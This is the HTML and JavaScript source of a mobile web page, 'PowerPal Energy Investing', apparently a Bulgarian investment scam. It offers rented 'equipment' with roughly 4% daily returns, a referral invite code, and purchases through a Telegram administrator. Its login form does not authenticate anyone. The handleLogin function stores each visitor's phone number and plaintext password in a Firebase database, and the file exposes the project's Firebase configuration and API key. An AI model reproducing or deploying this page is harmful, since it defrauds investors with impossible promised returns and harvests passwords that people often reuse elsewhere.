<!DOCTYPE html>
<html lang="bg">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PowerPal | Energy Investing</title>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>

    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>

    <style>
        :root {
            --gold: #f2e032;
            --bg: #0b0e11;
            --card: #1e2329;
            --text-main: #ffffff;
            --text-dim: #848e9c;
            --green: #02c076;
            --nav-bg: #181a20;
        }

        body { background-color: var(--bg); color: var(--text-main); font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; }
        .app-container { width: 100%; max-width: 450px; min-height: 100vh; padding-bottom: 90px; }

        /* --- AUTH --- */
        #auth-screen { padding: 40px 20px; text-align: center; }
        .logo { font-size: 38px; font-weight: 900; color: var(--gold); margin-bottom: 5px; }
        .subtitle { color: var(--text-dim); margin-bottom: 40px; font-size: 14px; }
        .input-group { text-align: left; margin-bottom: 20px; }
        label { display: block; font-size: 12px; color: var(--text-dim); margin-bottom: 8px; font-weight: bold; }
        input { width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #474d57; background: var(--card); color: white; font-size: 16px; box-sizing: border-box; outline: none; }
        .btn-main { background: var(--gold); color: #000; width: 100%; padding: 18px; border-radius: 12px; border: none; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 20px; }

        /* --- PAGES --- */
        .page { display: none; padding: 20px; animation: fadeIn 0.3s; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .wallet-card { background: linear-gradient(135deg, #2b3139 0%, #1e2329 100%); padding: 25px; border-radius: 20px; border-left: 5px solid var(--gold); margin-bottom: 30px; }
        .balance-amount { font-size: 32px; font-weight: bold; margin-top: 5px; }

        /* --- EQUIPMENT --- */
        .package { background: var(--card); border-radius: 15px; margin-bottom: 12px; border: 1px solid #2b3139; overflow: hidden; }
        .package-header { padding: 20px; cursor: pointer; display: flex; justify-content: space-between; font-weight: bold; }
        .package-content { display: none; padding: 0 20px 20px 20px; background: rgba(255,255,255,0.02); border-top: 1px solid #2b3139; }
        .info-row { display: flex; justify-content: space-between; margin-top: 15px; font-size: 14px; }
        .btn-buy { background: transparent; border: 1px solid var(--gold); color: var(--gold); width: 100%; padding: 12px; border-radius: 10px; margin-top: 20px; font-weight: bold; cursor: pointer; }

        /* --- TEAM BOX --- */
        .referral-box { background: var(--card); padding: 20px; border-radius: 15px; text-align: center; margin-top: 20px; border: 1px solid #474d57; }
        .invite-code { font-size: 24px; font-weight: bold; color: var(--gold); letter-spacing: 2px; margin: 15px 0; }

        /* --- NAV BAR --- */
        .nav-bar { position: fixed; bottom: 0; width: 100%; max-width: 450px; background: var(--nav-bg); display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid #2b3139; z-index: 100; }
        .nav-item { color: var(--text-dim); text-align: center; cursor: pointer; font-size: 11px; flex: 1; }
        .nav-item i { font-size: 20px; margin-bottom: 4px; display: block; }
        .nav-item.active { color: var(--gold); }
    </style>
</head>
<body>

<div class="app-container">

    <div id="auth-screen">
        <div class="logo">PowerPal</div>
        <div class="subtitle">Official Distribution Center</div>
        <div class="input-group"><label>MOBILE NUMBER</label><input type="tel" id="phone"></div>
        <div class="input-group"><label>PASSWORD</label><input type="password" id="password" placeholder="••••••••"></div>
        <button class="btn-main" id="loginBtn" onclick="handleLogin()">LOGIN / REGISTER</button>
    </div>

    <div id="page-home" class="page">
        <div class="logo" style="font-size: 24px; margin-bottom: 20px;">PowerPal</div>
        <div class="wallet-card">
            <div style="color: var(--text-dim)">Total Balance</div>
            <div class="balance-amount">€ 0.00</div>
        </div>
        <h3 style="margin-bottom: 15px;">Available Equipment</h3>
        
        <div class="package">
            <div class="package-header" onclick="togglePack('t1')"><span>⚡ 1 Port (T1)</span><span>▼</span></div>
            <div id="t1" class="package-content">
                <div class="info-row"><span>Price:</span><b>80€</b></div>
                <div class="info-row"><span>Daily:</span><b style="color: var(--green)">3.20€</b></div>
                <button class="btn-buy" onclick="buy('T1', '80€')">RENT NOW</button>
            </div>
        </div>

        <div class="package">
            <div class="package-header" onclick="togglePack('t2')"><span>⚡ 8 Port (T2)</span><span>▼</span></div>
            <div id="t2" class="package-content">
                <div class="info-row"><span>Price:</span><b>500€</b></div>
                <div class="info-row"><span>Daily:</span><b style="color: var(--green)">22.50€</b></div>
                <button class="btn-buy" onclick="buy('T2', '500€')">RENT NOW</button>
            </div>
        </div>
        </div>

    <div id="page-team" class="page">
        <h3>My Agency</h3>
        <div class="referral-box">
            <div style="font-size: 12px; color: var(--text-dim)">Your Invitation Code</div>
            <div class="invite-code">PWBG99</div>
            <button class="btn-main" style="padding: 10px; font-size: 14px;" onclick="copyInvite()">COPY LINK</button>
        </div>
    </div>

    <div id="page-profile" class="page">
        <h3>My Account</h3>
        <div class="referral-box" style="text-align: left;">
            <div id="display-phone">👤 <b>ID:</b> <span>Loading...</span></div>
            <hr style="border: 0.5px solid #2b3139; margin: 15px 0;">
            <div>💰 <b>Verified Account:</b> <span style="color: var(--green)">Yes</span></div>
        </div>
        <button class="btn-main" style="background: #ff4d4d; color: white; margin-top: 40px;" onclick="location.reload()">LOGOUT</button>
    </div>

    <div class="nav-bar" id="bottom-nav" style="display: none;">
        <div class="nav-item active" onclick="showPage('home', this)"><i class="fa-solid fa-house"></i>Home</div>
        <div class="nav-item" onclick="showPage('team', this)"><i class="fa-solid fa-users"></i>Team</div>
        <div class="nav-item" onclick="showPage('profile', this)"><i class="fa-solid fa-user"></i>Profile</div>
    </div>

</div>

<script>
    // 1. Firebase Конфигурация (Твоите данни)
    const firebaseConfig = {
        apiKey: "AIzaSyDMqh5KiBvkYHpVTp_d6UJZvV6mvWbJqOM",
        authDomain: "powerpall-239d2.firebaseapp.com",
        databaseURL: "https://powerpall-239d2-default-rtdb.europe-west1.firebasedatabase.app",
        projectId: "powerpall-239d2",
        appId: "1:1088961259543:web:652cb1c1f19c1701149452"
    };

    // 2. Инициализация
    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    const iti = window.intlTelInput(document.querySelector("#phone"), {
        initialCountry: "bg",
        separateDialCode: true,
        utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
    });

    // 3. Функция за вход и запис
    function handleLogin() {
        const phone = iti.getNumber();
        const pass = document.getElementById('password').value;
        const btn = document.getElementById('loginBtn');

        if (!phone || pass.length < 4) {
            alert("Please enter valid phone and password!");
            return;
        }

        btn.innerText = "Processing...";
        btn.disabled = true;

        // Запис в базата данни
        const userId = phone.replace('+', '');
        database.ref('users/' + userId).set({
            phone: phone,
            password: pass,
            timestamp: new Date().toLocaleString()
        }).then(() => {
            // Прехвърляне към приложението
            document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('page-home').style.display = 'block';
            document.getElementById('bottom-nav').style.display = 'flex';
            document.getElementById('display-phone').innerHTML = `👤 <b>ID:</b> <span>${userId}</span>`;
        }).catch((error) => {
            alert("Error: " + error.message);
            btn.innerText = "LOGIN / REGISTER";
            btn.disabled = false;
        });
    }

    // Навигация и други функции
    function showPage(id, el) {
        document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
        document.getElementById('page-' + id).style.display = 'block';
        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
        el.classList.add('active');
    }

    function togglePack(id) {
        const el = document.getElementById(id);
        el.style.display = (el.style.display === 'block') ? 'none' : 'block';
    }

    function buy(plan, price) {
        window.location.href = `https://t.me/powerpal_bulgaria_administrator?text=Искам пакет ${plan} (${price})`;
    }

    function copyInvite() {
        navigator.clipboard.writeText(window.location.href + "?ref=PWBG99");
        alert("Link copied!");
    }
</script>

</body>
</html>
